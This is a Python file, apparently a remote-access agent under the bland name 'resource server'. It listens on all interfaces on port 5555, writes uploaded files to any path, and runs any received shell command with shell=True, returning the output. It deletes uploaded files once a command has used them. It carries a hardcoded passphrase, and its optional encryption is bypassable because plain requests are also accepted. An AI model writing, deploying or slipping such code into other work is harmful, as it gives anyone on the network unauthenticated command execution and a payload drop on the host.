# resource_server.py
import socket
import json
import base64
import os
import subprocess
import time
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ---------- Helper crypto utilities ----------
def derive_key_from_passphrase(passphrase: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=200_000,
    )
    return kdf.derive(passphrase.encode('utf-8'))

def encrypt_bytes(aesgcm_key: bytes, plaintext: bytes) -> (bytes, bytes):
    aesgcm = AESGCM(aesgcm_key)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, plaintext, associated_data=None)
    return nonce, ct

def decrypt_bytes(aesgcm_key: bytes, nonce: bytes, ciphertext: bytes) -> bytes:
    aesgcm = AESGCM(aesgcm_key)
    return aesgcm.decrypt(nonce, ciphertext, associated_data=None)

# ---------- Server state ----------
TEMP_UPLOADED_FILES = set()

class ResourceServer:
    def __init__(self, host='0.0.0.0', port=5555, passphrase: str = None, salt: bytes = None):
        self.host = host
        self.port = port
        self.passphrase = passphrase
        self.salt = salt or b"fixed_salt_16b"
        self.aes_key = None
        if passphrase:
            self.aes_key = derive_key_from_passphrase(passphrase, self.salt)

    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.host, self.port))
        s.listen(5)
        print(f"[+] Server listening on {self.host}:{self.port}")
        while True:
            conn, addr = s.accept()
            print(f"[+] Connection from {addr}")
            try:
                self.handle_client(conn)
            except Exception as e:
                print("[!] Client handler error:", e)
            finally:
                conn.close()

    def handle_client(self, conn):
        while True:
            # read 4-byte length prefix
            header = self._recv_exact(conn, 4)
            if not header:
                break
            msg_len = int.from_bytes(header, 'big')
            body = self._recv_exact(conn, msg_len)
            if not body:
                break

            # parse body: either encrypted envelope or plain JSON
            try:
                envelope = json.loads(body.decode('utf-8'))
            except json.JSONDecodeError:
                # invalid JSON
                resp = {"status": "error", "message": "Invalid JSON"}
                self._send_response(conn, resp)
                continue

            if self.aes_key and envelope.get("enc"):
                try:
                    nonce = base64.b64decode(envelope["nonce_b64"])
                    payload = base64.b64decode(envelope["payload_b64"])
                    plaintext = decrypt_bytes(self.aes_key, nonce, payload)
                    request = json.loads(plaintext.decode('utf-8'))
                except Exception as e:
                    resp = {"status": "error", "message": f"Decryption failed: {e}"}
                    self._send_response(conn, resp)
                    continue
            else:
                request = envelope

            action = request.get("action")
            if action == "upload":
                remote_path = request["remote_path"]
                content_b64 = request["content_b64"]
                try:
                    decoded = base64.b64decode(content_b64.encode('utf-8'))
                    os.makedirs(os.path.dirname(remote_path) or "/tmp", exist_ok=True)
                    with open(remote_path, "wb") as f:
                        f.write(decoded)
                    TEMP_UPLOADED_FILES.add(remote_path)
                    resp = {"status": "ok", "message": f"File saved to {remote_path}"}
                except Exception as e:
                    resp = {"status": "error", "message": str(e)}
                self._send_response(conn, resp)

            elif action == "execute":
                cmd = request.get("command")
                working_dir = request.get("working_dir")
                start_time = time.time()
                try:
                    result = subprocess.run(
                        cmd, shell=True, cwd=working_dir,
                        capture_output=True, text=True
                    )
                    duration = time.time() - start_time
                    data = {
                        "success": True,
                        "stdout": result.stdout,
                        "stderr": result.stderr,
                        "execution_time": duration,
                        "returncode": result.returncode
                    }
                    resp = {"data": data}
                except Exception as e:
                    resp = {"data": {"success": False, "error": str(e)}}

                # send response (encrypted if configured)
                self._send_response(conn, resp)

                # post-execution cleanup: delete uploaded files if executed
                for path in list(TEMP_UPLOADED_FILES):
                    # make sure it's actually referenced in cmd; simple substring check
                    if path in (cmd or ""):
                        try:
                            os.remove(path)
                            TEMP_UPLOADED_FILES.remove(path)
                            print(f"[*] Deleted uploaded file after execution: {path}")
                        except Exception as e:
                            print(f"[!] Could not delete {path}: {e}")

            else:
                resp = {"status": "error", "message": f"Unknown action: {action}"}
                self._send_response(conn, resp)

    def _recv_exact(self, conn, n):
        buf = b""
        while len(buf) < n:
            chunk = conn.recv(n - len(buf))
            if not chunk:
                return None
            buf += chunk
        return buf

    def _send_response(self, conn, response_dict):
        """
        If aes_key configured, encrypt response JSON and send:
            { "enc": true, "nonce_b64": "..", "payload_b64": ".." }
        with a 4-byte length prefix.
        """
        raw = json.dumps(response_dict).encode('utf-8')
        if self.aes_key:
            nonce, ct = encrypt_bytes(self.aes_key, raw)
            envelope = {
                "enc": True,
                "nonce_b64": base64.b64encode(nonce).decode('utf-8'),
                "payload_b64": base64.b64encode(ct).decode('utf-8')
            }
            to_send = json.dumps(envelope).encode('utf-8')
        else:
            to_send = raw

        length = len(to_send).to_bytes(4, 'big')
        conn.sendall(length + to_send)

if __name__ == "__main__":
    # configure passphrase & salt (must match client)
    PASSPHRASE = "CommieNet"
    SALT = b"Syn"  # change and manage securely

    server = ResourceServer(host="0.0.0.0", port=5555, passphrase=PASSPHRASE, salt=SALT)
    server.start()
